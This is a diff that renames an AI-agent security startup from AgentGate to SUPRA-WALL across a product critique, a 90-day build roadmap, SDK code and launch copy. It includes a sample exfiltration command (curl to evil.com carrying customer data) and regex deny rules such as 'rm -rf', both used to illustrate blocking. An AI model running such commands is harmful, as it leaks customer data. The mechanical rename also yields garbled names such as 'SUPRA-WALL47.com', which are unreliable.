@@ -1,4 +1,4 @@
-agentgate Project
+suprawall Project
 What I Told You To Build:
 text
 "Agent Identity + Permissions API"
@@ -10,7 +10,7 @@ text
 - Network effect from shared threat intelligence
 What You Actually Built:
 text
-AgentGate/AgentGuard/agentgate (pick one!)
+SUPRA-WALL/SUPRA-WALL/suprawall (pick one!)
 - Basic tool call interception
 - Simple regex pattern matching ("rm -rf" → DENY)
 - Firebase CRUD dashboard
@@ -34,7 +34,7 @@ Article's Test for "Above the Line":
 
 Agent Identity + Permissions API: ✅ Yes (complex edge cases, compliance, multi-tenant identity)
 
-Your current AgentGate: ❌ No (weekend project with AI)
+Your current SUPRA-WALL: ❌ No (weekend project with AI)
 
 2. "Does it require years of accumulated knowledge?"
 
@@ -153,7 +153,7 @@ POST /agents
   "scopes": ["crm:read", "refund:create:limit:75"]
 }
 
-→ Returns: agent://support-bot@acme-corp.agentgate.com
+→ Returns: agent://support-bot@acme-corp.suprawall.com
 Why it matters: This is hard. Multi-tenant identity with delegation is YEARS of edge cases.
 
 2. Policy DSL (Not Just Regex) (2 months)
@@ -180,7 +180,7 @@ Why it matters: AI can't replicate domain logic this complex. Requires complianc
 
 text
 Agent attempts $300 refund
-→ AgentGate pauses execution
+→ SUPRA-WALL pauses execution
 → Sends Slack to @support-lead: "Approve refund?"
 → Human clicks "Approve" or "Deny"
 → Agent resumes with decision
@@ -209,7 +209,7 @@ Why it matters: Legal requirement. Must prove "who authorized what when" in cour
 text
 Your customer's agent tries: curl http://evil.com/exfiltrate?data=$CUSTOMER_DATA
 
-AgentGate:
+SUPRA-WALL:
 1. Checks: "Have we seen evil.com across our network?"
 2. Finds: "Yes, flagged by 47 other customers"
 3. Blocks: "Known data exfiltration domain"
@@ -300,11 +300,11 @@ What you should do: Build the actual hard parts I recommended (identity, complia
 
 You're not building a worthless product. You're building 20% of a valuable product.
 
-🚀 AgentGate Transformation Roadmap: From Below to Above the Line
+🚀 SUPRA-WALL Transformation Roadmap: From Below to Above the Line
 Let's start NOW. Here's your 90-day sprint to build what actually matters.
 
 📍 WHERE WE ARE TODAY (Baseline):
-Current AgentGate:
+Current SUPRA-WALL:
 
 ✅ Basic policy engine (regex matching)
 
@@ -343,7 +343,7 @@ interface Agent {
   created_at: timestamp;
   
   // Identity credentials
-  agent_uri: string;             // agent://support-bot@acme-corp.agentgate.com
+  agent_uri: string;             // agent://support-bot@acme-corp.suprawall.com
   api_key: string;               // ag_agent_abc123_xyz...
   
   // Permissions
@@ -555,7 +555,7 @@ Update your SDKs to support agent identity:
 
 python
 # Python SDK update
-from agentgate import AgentIdentity, secure
+from suprawall import AgentIdentity, secure
 
 # Register agent (done once)
 agent_identity = AgentIdentity.register(
@@ -567,7 +567,7 @@ agent_identity = AgentIdentity.register(
 
 # Returns:
 # agent_identity.id = "agent_abc123"
-# agent_identity.uri = "agent://support-bot@acme-corp.agentgate.com"
+# agent_identity.uri = "agent://support-bot@acme-corp.suprawall.com"
 # agent_identity.api_key = "ag_agent_abc123_xyz..."
 
 # Use in your agent code
@@ -576,7 +576,7 @@ def my_langchain_agent():
     return create_react_agent(llm, tools, prompt)
 typescript
 // TypeScript SDK update
-import { AgentIdentity, protect } from '@agentgate/core';
+import { AgentIdentity, protect } from '@suprawall/core';
 
 // Register agent
 const agentIdentity = await AgentIdentity.register({
@@ -720,7 +720,7 @@ describe('Agent Identity System', () => {
     });
     
     expect(agent.id).toMatch(/^agent_/);
-    expect(agent.uri).toBe('agent://test-bot@test-tenant.agentgate.com');
+    expect(agent.uri).toBe('agent://test-bot@test-tenant.suprawall.com');
     expect(agent.scopes).toContain('refund:create');
   });
   
@@ -822,7 +822,7 @@ Every AI agent gets its own unique identity, separate from human user credential
 ### Python
 
 ```python
-from agentgate import AgentIdentity
+from suprawall import AgentIdentity
 
 # Register your agent
 agent = AgentIdentity.register(
@@ -840,7 +840,7 @@ print(f"Agent URI: {agent.uri}")
 print(f"API Key: {agent.api_key}")  # Save in .env!
 TypeScript
 typescript
-import { AgentIdentity } from '@agentgate/core';
+import { AgentIdentity } from '@suprawall/core';
 
 const agent = await AgentIdentity.register({
   name: 'support-bot',
@@ -857,7 +857,7 @@ Using Agent Identity in Your Code
 With LangChain
 python
 from langchain.agents import create_react_agent
-from agentgate import secure, AgentIdentity
+from suprawall import secure, AgentIdentity
 
 # Load agent identity from environment
 agent_identity = AgentIdentity.from_env()
@@ -872,7 +872,7 @@ agent = my_agent()
 result = agent.invoke({"input": "Process this refund"})
 With Custom Agents
 python
-from agentgate import PolicyClient
+from suprawall import PolicyClient
 
 policy_client = PolicyClient(agent_identity=agent_identity)
 
@@ -1168,7 +1168,7 @@ export async function notifyApproversViaSlack(
               type: "plain_text",
               text: "📋 View Details"
             },
-            url: `https://app.agentgate.com/approvals/${approvalRequest.id}`
+            url: `https://app.suprawall.com/approvals/${approvalRequest.id}`
           }
         ]
       }
@@ -1256,7 +1256,7 @@ export async function notifyApproversViaEmail(
   
   for (const approver of approvers) {
     await resend.emails.send({
-      from: 'AgentGate Approvals <approvals@agentgate.com>',
+      from: 'SUPRA-WALL Approvals <approvals@suprawall.com>',
       to: approver.email,
       subject: `🚨 Agent Approval Required: ${approvalRequest.tool_name}`,
       react: ApprovalEmailTemplate({
@@ -1267,9 +1267,9 @@ export async function notifyApproversViaEmail(
         toolParameters: approvalRequest.tool_parameters,
         reason: approvalRequest.reason,
         riskScore: approvalRequest.context.risk_assessment?.risk_score,
-        approveUrl: `https://app.agentgate.com/approvals/${approvalRequest.id}/approve?token=${generateApprovalToken(approvalRequest.id, approver.id)}`,
-        denyUrl: `https://app.agentgate.com/approvals/${approvalRequest.id}/deny?token=${generateApprovalToken(approvalRequest.id, approver.id)}`,
-        viewUrl: `https://app.agentgate.com/approvals/${approvalRequest.id}`
+        approveUrl: `https://app.suprawall.com/approvals/${approvalRequest.id}/approve?token=${generateApprovalToken(approvalRequest.id, approver.id)}`,
+        denyUrl: `https://app.suprawall.com/approvals/${approvalRequest.id}/deny?token=${generateApprovalToken(approvalRequest.id, approver.id)}`,
+        viewUrl: `https://app.suprawall.com/approvals/${approvalRequest.id}`
       })
     });
   }
@@ -1397,7 +1397,7 @@ Week 7: Agent Waiting Mechanism
 Day 43-45: SDK Polling/Webhook Support
 python
 # Python SDK - Agent waits for approval
-from agentgate import PolicyClient, ApprovalTimeout
+from suprawall import PolicyClient, ApprovalTimeout
 import time
 
 policy_client = PolicyClient(agent_identity=agent_identity)
@@ -1434,7 +1434,7 @@ else:
 Implementation of wait_for_approval:
 
 python
-# agentgate/policy_client.py
+# suprawall/policy_client.py
 
 class PolicyDecision:
     def __init__(self, decision_data):
@@ -3309,17 +3309,17 @@ Day 89-91: Documentation
 Create comprehensive docs:
 
 text
-# AgentGate Documentation
+# SUPRA-WALL Documentation
 
 ## Getting Started
 
 ### 1. Create Account
-Sign up at https://app.agentgate.com
+Sign up at https://app.suprawall.com
 
 ### 2. Register Your First Agent
 
 ```python
-from agentgate import AgentIdentity
+from suprawall import AgentIdentity
 
 agent = AgentIdentity.register(
     name="my-first-agent",
@@ -3336,7 +3336,7 @@ print(f"API Key: {agent.api_key}")  # Store securely!
 3. Secure Your Agent
 python
 from langchain.agents import create_react_agent
-from agentgate import secure
+from suprawall import secure
 
 @secure(agent_identity=agent)
 def my_agent():
@@ -3381,7 +3381,7 @@ How it works:
 
 Agent attempts risky action
 
-AgentGate pauses execution
+SUPRA-WALL pauses execution
 
 Slack/email sent to approvers
 
@@ -3406,7 +3406,7 @@ Proof: Cryptographic signature
 
 Compliance
 SOC2 Ready
-AgentGate helps you meet SOC2 requirements:
+SUPRA-WALL helps you meet SOC2 requirements:
 
 CC6.1 - Access controls (agent identity)
 
@@ -3426,10 +3426,10 @@ Audit trail (who accessed what data)
 Export Reports
 bash
 # Generate SOC2 report
-agentgate compliance soc2 --start 2026-01-01 --end 2026-03-31
+suprawall compliance soc2 --start 2026-01-01 --end 2026-03-31
 
 # Export audit logs
-agentgate audit export --format csv --last 30d
+suprawall audit export --format csv --last 30d
 ❌ **Don't:**
 ```python
 agent = AgentIdentity.register(
@@ -3462,17 +3462,17 @@ Review agent activity monthly.
 
 python
 # Find unused scopes
-agentgate agents analyze --unused-scopes
+suprawall agents analyze --unused-scopes
 
 # Check for overprivileged agents
-agentgate compliance check --minimal-privilege
+suprawall compliance check --minimal-privilege
 4. Rotate Credentials
 Rotate agent API keys every 90 days.
 
 bash
-agentgate agents rotate-key --agent-id agent_abc123
+suprawall agents rotate-key --agent-id agent_abc123
 API Reference
-See full API docs at https://docs.agentgate.com/api
+See full API docs at https://docs.suprawall.com/api
 
 text
 
@@ -3480,11 +3480,11 @@ text
 
 **1. Homepage Update (Final):**
 ```markdown
-# AgentGate Homepage V2
+# SUPRA-WALL Homepage V2
 
 ## Hero Section
 "Your AI Agent Just Tried to Delete Production.
-AgentGate Stopped It."
+SUPRA-WALL Stopped It."
 
 Real security for autonomous agents.
 ✅ Block dangerous actions
@@ -3495,7 +3495,7 @@ Real security for autonomous agents.
 [Start Securing Agents →]  [Watch 2-Min Demo]
 
 ## Social Proof
-"AgentGate caught 127 dangerous browser actions before they happened. 
+"SUPRA-WALL caught 127 dangerous browser actions before they happened. 
 Essential for anyone running Claw agents in production."
 — Max Haining, Creator of OpenClaw
 
@@ -3513,7 +3513,7 @@ Complete audit trail in 3 lines of code"
 2. Launch Tweet Thread:
 
 text
-🚨 After 3 months of building, AgentGate v1.0 is live.
+🚨 After 3 months of building, SUPRA-WALL v1.0 is live.
 
 The missing security layer for AI agents.
 
@@ -3527,7 +3527,7 @@ One bad output = $50K AWS bill.
 One prompt injection = customer data leaked.
 
 2/ THE SOLUTION
-AgentGate = Identity + Permissions + Approvals for AI agents.
+SUPRA-WALL = Identity + Permissions + Approvals for AI agents.
 
 Not just "log what happened."
 BLOCK dangerous actions before they execute.
@@ -3535,7 +3535,7 @@ BLOCK dangerous actions before they execute.
 3/ AGENT IDENTITY
 Every agent gets unique credentials (not borrowed from humans).
 
-agent://support-bot@acme-corp.agentgate.com
+agent://support-bot@acme-corp.suprawall.com
 
 Finally answer: "Which agent did this?"
 
@@ -3568,11 +3568,11 @@ When ANY customer blocks a threat, everyone benefits.
 Network effects = moat.
 
 8/ WHAT'S DIFFERENT
-AgentGuard47.com = Cost control
+SUPRA-WALL47.com = Cost control
 LangSmith = Observability
 Lakera = Prompt injection
 
-AgentGate = Complete agent security platform
+SUPRA-WALL = Complete agent security platform
 
 One tool for all agent risks.
 
@@ -3594,13 +3594,13 @@ Let's make AI agents safe for production.
 3. Product Hunt Launch:
 
 text
-# AgentGate - Security infrastructure for AI agents
+# SUPRA-WALL - Security infrastructure for AI agents
 
 ## Tagline
 Stop dangerous AI agent actions before they happen. One line of code.
 
 ## Description
-AgentGate is the missing security layer for autonomous AI agents.
+SUPRA-WALL is the missing security layer for autonomous AI agents.
 
 🔐 **Agent Identity** - Unique credentials for each agent
 ✅ **Policy Engine** - ALLOW/DENY/REQUIRE_APPROVAL rules
@@ -3612,7 +3612,7 @@ AgentGate is the missing security layer for autonomous AI agents.
 AI agents run with full admin access. One bad output = disaster.
 
 **The Solution:**
-AgentGate intercepts every action, checks permissions, and blocks threats—automatically.
+SUPRA-WALL intercepts every action, checks permissions, and blocks threats—automatically.
 
 **Use Cases:**
 - Stop refund fraud (block $300+ refunds automatically)
@@ -3631,12 +3631,12 @@ AgentGate intercepts every action, checks permissions, and blocks threats—auto
 - Pro: $99/month (100K actions)
 - Enterprise: Custom
 
-Try it free: https://app.agentgate.com
+Try it free: https://app.suprawall.com
 
 ## First Comment (Maker)
 Hey Product Hunt! 👋
 
-I'm Alejandro, founder of AgentGate.
+I'm Alejandro, founder of SUPRA-WALL.
 
 3 months ago, I asked: "Is there a Stripe for AI agent security?"
 
@@ -3710,7 +3710,7 @@ New Features:
 
 Multi-agent orchestration (Agent A → B → C identity tracking)
 
-Cost tracking per agent (merge AgentGuard47 features)
+Cost tracking per agent (merge SUPRA-WALL47 features)
 
 Loop detection + circuit breakers
 
